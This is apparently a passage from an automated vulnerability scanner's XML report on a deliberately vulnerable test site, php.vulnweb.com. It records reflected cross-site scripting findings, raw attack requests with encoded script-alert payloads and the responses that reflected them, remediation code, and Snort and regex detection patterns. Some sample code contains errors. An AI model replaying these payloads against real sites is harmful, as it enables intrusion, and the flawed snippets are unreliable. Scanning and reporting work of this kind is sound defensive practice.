single-factor authentication. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the web, or given to you by an acquaintance) for use in your own code. </li></ul>
Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. These should be used to sanitize all input before displayed to the client. 
<br /><br />
ASP / ASP.NET: Server.HTMLEncode (strHTML String)<br /><br />]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the Web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure the data being returned is what is expected, and is valid. </li><li>When adding extra functionality to user-input checking, use client-side validation in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user-supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered "&lt;script&gt;alertdocumentcookie('aaa')&lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response. Encoding ensures that the characters cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms, such as requiring a token and password, as opposed to single-factor authentication, such as requiring only a password. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the Web or given to you by an acquaintance) for use in your own code. </li></ul>
The Java language does not have a built-in method to convert the value of the input variable into correct, non-interpretable HTML. The following code samples show two different ways of writing a utility method to sanitize all user input before displaying it back to the client. <br /><br /><br />
public static String HTMLEncode(String aTagFragment){ <br /><br />
  //make sure you replace &amp; first<br />
  aTagFragment = aTagFragment.replaceAll("&amp;", "&amp;amp;"); <br />
  aTagFragment = aTagFragment.replaceAll("&lt;", "&amp;lt;"); <br />
  aTagFragment = aTagFragment.replaceAll("&gt;", "&amp;gt;"); <br />
  aTagFragment = aTagFragment.replaceAll("\"", "&amp;quot;"); <br />
  aTagFragment = aTagFragment.replaceAll("'", "&amp;#39;"); <br />
  //replace backslash ‘\’ character<br />
  aTagFragment = aTagFragment.replaceAll("\\\\", "&amp;#92;"); <br /><br />
  return aTagFragment; <br />
}<br /><br />
public static String HTMLEncode(String aTagFragment){ <br />
  final StringBuffer result = new StringBuffer();<br />
  final StringCharacterIterator iterator = new StringCharacterIterator(aTagFragment); <br />
  char character = iterator.current();<br />
  while (character != StringCharacterIterator.DONE ){ <br />
   		if (character == '&lt;') { <br />
   			result.append("&amp;lt;"); <br />
   		} <br />
   		else if (character == '&gt;') { <br />
   			result.append("&amp;gt;"); <br />
   		} <br />
   		else if (character == '\"') { <br />
   			result.append("&amp;quot;"); <br />
   		} <br />
   		else if (character == '\'") { <br />
   			result.append("&amp;#39;"); <br />
   		} <br />
   		else if (character == '\\') { <br />
   			result.append("&amp;#92;"); <br />
   		} <br />
   		else if (character == '&amp;') { <br />
   			result.append("&amp;amp;"); <br />
   		} <br />
   		else { <br />
   			//the char is not a special one <br />
   			//add it to the result as is <br />
   			result.append(character); <br />
   		} <br />
   		character = iterator.next();<br />
   	} <br />
   	return result.toString();<br />
}]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="C62E30BACFBE91FE1BBC2C5F4D6D7D56"><![CDATA[GET /hpp/params.php?p=valid%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%37%37%32%34%31%29%3c%2f%73%43%72%49%70%54%3e&pp=12&aaaa=Submit HTTP/1.1
Referer: http://php.vulnweb.com/hpp/?pp=12
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="C62E30BACFBE91FE1BBC2C5F4D6D7D56";PSID="793A823C2E6F80ADC40DEDD5432FE66A";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="p";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="valid%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2537%2537%2532%2534%2531%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="42";tt="40";
X-RequestManager-Memo: sid="33";smi="0";sc="1";ID="b25dae92";
X-Request-Memo: ID="55fcb3ca";sc="1";tid="42";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:52:51 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 36

valid<sCrIpT>alert(77241)</sCrIpT>12]]></RawResponse><Request id="C62E30BACFBE91FE1BBC2C5F4D6D7D56"><Method>GET</Method><Path>/hpp/</Path><File>params</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>p=valid%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%37%37%32%34%31%29%3c%2f%73%43%72%49%70%54%3e&amp;pp=12&amp;aaaa=Submit</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>p</Name><Value>valid%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%37%37%32%34%31%29%3c%2f%73%43%72%49%70%54%3e</Value></Query><Query><Name>pp</Name><Value>12</Value></Query><Query><Name>aaaa</Name><Value>Submit</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/hpp/?pp=12</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="C62E30BACFBE91FE1BBC2C5F4D6D7D56";PSID="793A823C2E6F80ADC40DEDD5432FE66A";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="p";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="valid%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2537%2537%2532%2534%2531%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="42";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="33";smi="0";sc="1";ID="b25dae92";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="55fcb3ca";sc="1";tid="42";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[valid<sCrIpT>alert(77241)</sCrIpT>12]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:52:51 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>36</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="354D91E959028B76C289FEAF7E6F4249"><URL>http://php.vulnweb.com:80/secured/newuser.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor>urname</AttackParamDescriptor><Issues><Issue id="9ac4b6b2-bb69-458e-a933-12218c15829f"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5105</EngineType><AttackHTTPRequest><![CDATA[POST /secured/newuser.php HTTP/1.1
Referer: http://php.vulnweb.com/signup.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 242
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="354D91E959028B76C289FEAF7E6F4249";PSID="FAF765E4B6181822E8C9C961F9569838";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="urname";AttackParamIndex="3";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="12345%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2535%2534%2534%2538%2532%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="41";tt="40";
X-RequestManager-Memo: sid="31";smi="0";sc="1";ID="b2625338";
X-Request-Memo: ID="917ce9f2";sc="1";tid="41";
Cookie: CustomCookie=WebInspect0

uuname=12345&upass=foo&upass2=foo&urname=12345%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%35%34%34%38%32%29%3c%2f%73%43%72%49%70%54%3e&ucc=12345&uemail=John.Doe%40somewhere.com&uphone=770&uaddress=1707%20Interdimensional%20Street&signup=signup]]></AttackHTTPRequest><VulnerabilityID>5649</VulnerabilityID><Severity>4</Severity><Name>Cross-Site Scripting</Name><Classifications><Classification kind="CWE" identifier="CWE-80" href="http://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="Cross-Site Scripting: Reflected" href="https://vulncat.fortify.com/">Cross-Site Scripting: Reflected</Classification></Classifications><DetectionSelection><Location offset="811" length="29" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<drc_fortify /><hp-img src="xss.rgc" /><br /><drc_xssrf />A Cross-Site Scripting (XSS) vulnerability was detected in the web application. Cross-Site Scripting occurs when dynamically generated web pages display user input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. In this instance, the web application was vulnerable to an automatic payload, meaning the user simply has to visit a page to make the malicious scripts execute. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on end user systems. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
Cross-Site Scripting(XSS) happens when user input from a web client is immediately included via server-side scripts in a dynamically generated web page. Reflected XSS is specifically considered critical when malicious payload can be embedded in a URL (e.g. in query strings of GET requests). An attacker can trick a victim, via phishing attack, to click on a link with vulnerable input which has been altered to include attack code and then sent to the legitimate server. The injected code is then reflected back to the user's browser which executes it. <br /><br />

The implications of successful Cross-Site Scripting attacks are:

<ul><li>Account hijacking -  An attacker can hijack the user's session before the session cookie expires and take actions with the privileges of the user who accessed the URL, such as issuing database queries and viewing the results. </li><li>Malicious script execution - Users can unknowingly execute JavaScript, VBScript, ActiveX, HTML, or even Flash content that has been inserted into a dynamically generated page by an attacker. 

</li><li>Worm propagation - With Ajax applications, XSS can propagate somewhat like a virus. The XSS payload can autonomously inject itself into pages, and easily re-inject the same host with more XSS, all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user.
</li><li>Information theft - Via redirection and fake sites, attackers can connect users to a malicious server of the attacker's choice and capture any information entered by the user.</li><li>	Denial of Service - Often by utilizing malformed display requests on sites that contain a Cross-Site Scripting vulnerability, attackers can cause a denial of service condition to occur by causing the host site to query itself repeatedly . </li><li>Browser Redirection - On certain types of sites that use frames, a user can be made to think that he is in fact on the original site when he has been redirected to a malicious one, since the URL in the browser's address bar will remains the same. This is because the entire page isn't being redirected, just the frame in which the JavaScript is being executed is redirected. </li><li>	Manipulation of user settings - Attackers can change user settings for nefarious purposes. </li><li>Bypass Content-Security-Policy protection  -  Attackers can inject a malformed tag formation, known as dangling tag injection, which in some cases allows injected script to reuse valid nonce on the page and bypass script source restriction. Additionally dangling tag injection can be used to steal sensitive information embedded in HTML response if browser is able to make a request to the injected link. </li><li>Base tag injection: Attacker can cause relative links on a page to load from a different domain by modifying the base URL for the page via base tag injection.</li><li>Link prefetch injection: While unable to execute script, attackers can use link tag with rel=prefetch that will make browsers pre-fetch the specified link even though it is never rendered and rejected subsequently due to web application enforced cross-site policy (e.g. CSP protections).</li><li>Edge side includes (ESI) Injection - ESI  is a markup language used in various HTTP devices, such as reverse proxies and load balancers, that are positioned between client and server.  An attacker can inject ESI markup to perform critical attacks such as cross-site scripting and HTTPOnly cookie protection bypass. </li></ul>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />

View the attack string included with the request to check what to search for in the response. For instance, if "(javascript:alert('XSS')"  is submitted as an attack (or another scripting language), it will also appear as part of the response.  This indicates that the web application is taking values from the HTTP request parameters and using them in the HTTP response without first removing potentially malicious data.


The response can be viewed in “Web Browser” view in the Vulnerability pane to see the injected popup events in action. Events requiring user interaction (e.g. onmouseover or onclick events) can be triggered by performing the corresponding action (e.g. clicking the injected link). 



Injection with numeric string in src, or href, attributes indicates that the site is vulnerable to script include or content exfiltration. These can be verified by repeating the request in a browser and intercepting originating network traffic in a web proxy.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />
Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. When validating user input, 

verify that it matches the strictest definition of valid input possible. For example, if a certain parameter is supposed to be a number, attempt 

to convert it to a numeric data type in your programming language. <br /><br /><b>PHP:</b> intval("0".$_GET['q']);   <br /><br /><b>ASP.NET:</b> 

int.TryParse(Request.QueryString["q"], out val); <br /><br />

The same applies to date and time values, or anything that can be converted to a stricter type before being used. When accepting other types of 

text input, make sure the value matches either a list of acceptable values (white-listing), or a strict regular expression. If at any point the 

value appears invalid, do not accept it. Also, do not attempt to return the value to the user in an error message. <br /><br />

Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. 

These should be used to sanitize all input before it is displayed to the client. <br /><br /><b>PHP:</b>  string htmlspecialchars (string string 

[, int quote_style])<br /><br /><b>ASP.NET:</b> Server.HTMLEncode (strHTML String)



<br /><br />

When reflecting values into JavaScript or another format, make sure to use a type of encoding that is appropriate. Encoding data for HTML is not 

sufficient when it is reflected inside of a script or style sheet. For example, when reflecting data in a JavaScript string, make sure to encode 

all non-alphanumeric characters using hex (\xHH) encoding.<br /><br />

If you have JavaScript on your page that accesses unsafe information (like location.href) and writes it to the page (either with document.write, 

or by modifying a DOM element), make sure you encode data for HTML before writing it to the page. JavaScript does not have a built-in function to 

do this, but many frameworks do. If you are lacking an available function, something like the following will handle most cases:<br /><br />

s = s.replace(/&amp;/g,'&amp;amp;').replace(/"/i,'&amp;quot;').replace(/&lt;/i,'&amp;lt;').replace(/&gt;/i,'&amp;gt;').replace(/'/i,'&amp;apos;')


<br /><br />

Ensure that you are always using the right approach at the right time. Validating user input should be done as soon as it is received. Encoding 

data for display should be done immediately before displaying it.

<b><br /><br />


For Security Operations:</b><br /><br />

Server-side encoding, where all dynamic content is first sent through an encoding function where Scripting tags will be replaced with codes in the 

selected character set, can help to prevent Cross-Site Scripting attacks. <br /><br />

Many web application platforms and frameworks have some built-in support for preventing Cross-Site Scripting. Make sure that any built-in 

protection is enabled for your platform. In some cases, a misconfiguration could allow Cross-Site Scripting. In ASP.NET, if a page's 

EnableViewStateMac property is set to False, the ASP.NET view state can be used as a vector for Cross-Site Scripting. <br /><br />

An IDS or IPS can also be used to detect or filter out XSS attacks. Below are a few regular expressions that will help detect Cross-Site 

Scripting. <br /><br /><b>Regex for a simple XSS attack:</b><br />
/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/ix <br /><br />

The above regular expression would be added into a new Snort rule as follows: <br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"NII Cross-Site Scripting attempt"; flow:to_server,established; 

pcre:"/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/i"; classtype:Web-application-attack; sid:9000; rev:5;) <br /><br /><b>Paranoid regex for 

XSS attacks:</b><br />
/((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/I <br /><br />

This signature simply looks for the opening HTML tag, and its hex equivalent, followed by one or more characters other than the new line, and then 

followed by the closing tag or its hex equivalent. This may end up giving a few false positives depending upon how your web application and web 

server are structured, but it is guaranteed to catch anything that even remotely resembles a Cross-Site Scripting attack.

<br /><br /><b>For QA:</b><br /><br />


Fixes for Cross-Site Scripting defects will ultimately require code based fixes. Read the the following links for more information 

about manually testing your application for Cross-Site Scripting.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><br /><b>OWASP Cross-Site Scripting Information</b><br /><a href="https://www.owasp.org/index.php/XSS">https://www.owasp.org/index.php/XSS</a><br /><br /><b>CERT</b><br /><a href="http://www.cert.org/advisories/CA-2000-02.html">http://www.cert.org/advisories/CA-2000-02.html</a><br /><br /><b>Apache</b><br /><a href="http://httpd.apache.org/info/css-security/apache_specific.html">http://httpd.apache.org/info/css-security/apache_specific.html</a><br /><br /><b>SecurityFocus.com</b><br /><a href="http://www.securityfocus.com/infocus/1768 ">http://www.securityfocus.com/infocus/1768 </a>]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Cross-Site Scripting occurs when dynamically generated web pages display input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, utilizing client-side validation of user supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[When successfully exploited, Cross-Site Scripting gives an attacker a method of taking control of the interaction between a user and a web site. On a simple site composed of static content, this might only lead to changing how pages display to a specific user. When the site is capable of accepting user input, such as login information, or allows users to make choices with real world implications such as transferring funds or accessing private data, Cross-Site Scripting presents its most serious threat. The most significant danger from a successful Cross-Site Scripting attack is that an attacker will be able to emulate the credentials of an actual user by gaining access to a user’s session cookie, thereby hijacking the user session and taking over the account. The FDIC has recently indicated that unauthorized access to checking accounts is the fastest growing form of identity theft. More often than not, these instances of account hijacking are due to the presence of Cross-site scripting vulnerabilities. When an attacker gains control on the user’s end, it then often becomes unnecessary to break into the server. By that point, he already has the means to acquire the information he needs.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[To carry out a Cross-Site Scripting attack, an attacker will create a URL that takes advantage of a Cross-Site Scripting flaw. The attacker must then find some way of getting a victim to visit this URL. This can be done in many ways, ranging from getting it listed in a search engine to exploiting weaknesses in mail clients that allow scripted content to be executed. Once the victim has used the Cross-Site Scripting URL, the attacker's malicious code will be executed on his or her system.  In other words, there is a lot of effort required up-front for these attacks to be successful.  However, the potential payoff makes that effort worthwhile more often than not.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed quickly, especially if the application is already in production.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. Validation can be done using standard ASP.NET Validation controls, or directly in your code. Do not attempt to sanitize input by removing script strings or characters, simply reject it. Always use as strict a pattern as you can possibly allow.<br /><br />
Encoding of output insures that any scriptable content is properly encoded for HTML before being sent to the client. This is done with the function HttpUtility.HtmlEncode, as shown in the following Label control sample:<br /><br />
	Label2.Text = HttpUtility.HtmlEncode(input)
<br /><br />Be sure to consider all paths that user input takes through your application. For instance, if data is entered by the user, stored in a database, and then redisplayed later, you must make sure it is properly encoded each time it is retrieved.If you must allow free-format text input, such as in a message board, and you wish to allow some HTML formatting to be used, you can handle this safely by explicitly allowing only a small list of safe tags. Here is an example of how to do this safely:<br /><br />
C# Example:<br /><br />
            StringBuilder sb = new StringBuilder(<br />
                HttpUtility.HtmlEncode(input)); <br />
            sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;"); <br />
            sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;"); <br />
            Response.Write(sb.ToString());<br /><br />

VB.NET Example: <br /><br />
        Dim sb As StringBuilder = New StringBuilder( _ <br />
                HttpUtility.HtmlEncode(input)) <br />
        sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;") <br />
        sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;") <br />
        Response.Write(sb.ToString())<br /><br />

The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure what is being returned is what is expected, and is valid. </li><li>Use client-side validation when adding extra functionality to user input checking in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered " &lt;script&gt;alertdocumentcookie( 'aaa') &lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response, so that they cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms as opposed to single-factor authentication. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the web, or given to you by an acquaintance) for use in your own code. </li></ul>
Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. These should be used to sanitize all input before displayed to the client. 
<br /><br />
ASP / ASP.NET: Server.HTMLEncode (strHTML String)<br /><br />]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the Web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure the data being returned is what is expected, and is valid. </li><li>When adding extra functionality to user-input checking, use client-side validation in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user-supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered "&lt;script&gt;alertdocumentcookie('aaa')&lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response. Encoding ensures that the characters cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms, such as requiring a token and password, as opposed to single-factor authentication, such as requiring only a password. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the Web or given to you by an acquaintance) for use in your own code. </li></ul>
The Java language does not have a built-in method to convert the value of the input variable into correct, non-interpretable HTML. The following code samples show two different ways of writing a utility method to sanitize all user input before displaying it back to the client. <br /><br /><br />
public static String HTMLEncode(String aTagFragment){ <br /><br />
  //make sure you replace &amp; first<br />
  aTagFragment = aTagFragment.replaceAll("&amp;", "&amp;amp;"); <br />
  aTagFragment = aTagFragment.replaceAll("&lt;", "&amp;lt;"); <br />
  aTagFragment = aTagFragment.replaceAll("&gt;", "&amp;gt;"); <br />
  aTagFragment = aTagFragment.replaceAll("\"", "&amp;quot;"); <br />
  aTagFragment = aTagFragment.replaceAll("'", "&amp;#39;"); <br />
  //replace backslash ‘\’ character<br />
  aTagFragment = aTagFragment.replaceAll("\\\\", "&amp;#92;"); <br /><br />
  return aTagFragment; <br />
}<br /><br />
public static String HTMLEncode(String aTagFragment){ <br />
  final StringBuffer result = new StringBuffer();<br />
  final StringCharacterIterator iterator = new StringCharacterIterator(aTagFragment); <br />
  char character = iterator.current();<br />
  while (character != StringCharacterIterator.DONE ){ <br />
   		if (character == '&lt;') { <br />
   			result.append("&amp;lt;"); <br />
   		} <br />
   		else if (character == '&gt;') { <br />
   			result.append("&amp;gt;"); <br />
   		} <br />
   		else if (character == '\"') { <br />
   			result.append("&amp;quot;"); <br />
   		} <br />
   		else if (character == '\'") { <br />
   			result.append("&amp;#39;"); <br />
   		} <br />
   		else if (character == '\\') { <br />
   			result.append("&amp;#92;"); <br />
   		} <br />
   		else if (character == '&amp;') { <br />
   			result.append("&amp;amp;"); <br />
   		} <br />
   		else { <br />
   			//the char is not a special one <br />
   			//add it to the result as is <br />
   			result.append(character); <br />
   		} <br />
   		character = iterator.next();<br />
   	} <br />
   	return result.toString();<br />
}]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="354D91E959028B76C289FEAF7E6F4249"><![CDATA[POST /secured/newuser.php HTTP/1.1
Referer: http://php.vulnweb.com/signup.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 242
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="354D91E959028B76C289FEAF7E6F4249";PSID="FAF765E4B6181822E8C9C961F9569838";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="urname";AttackParamIndex="3";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="12345%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2535%2534%2534%2538%2532%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="41";tt="40";
X-RequestManager-Memo: sid="31";smi="0";sc="1";ID="b2625338";
X-Request-Memo: ID="917ce9f2";sc="1";tid="41";
Cookie: CustomCookie=WebInspect0

uuname=12345&upass=foo&upass2=foo&urname=12345%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%35%34%34%38%32%29%3c%2f%73%43%72%49%70%54%3e&ucc=12345&uemail=John.Doe%40somewhere.com&uphone=770&uaddress=1707%20Interdimensional%20Street&signup=signup]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:52:51 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 811

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>add new user</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="style.css" rel="stylesheet" type="text/css">
</head>
<body>
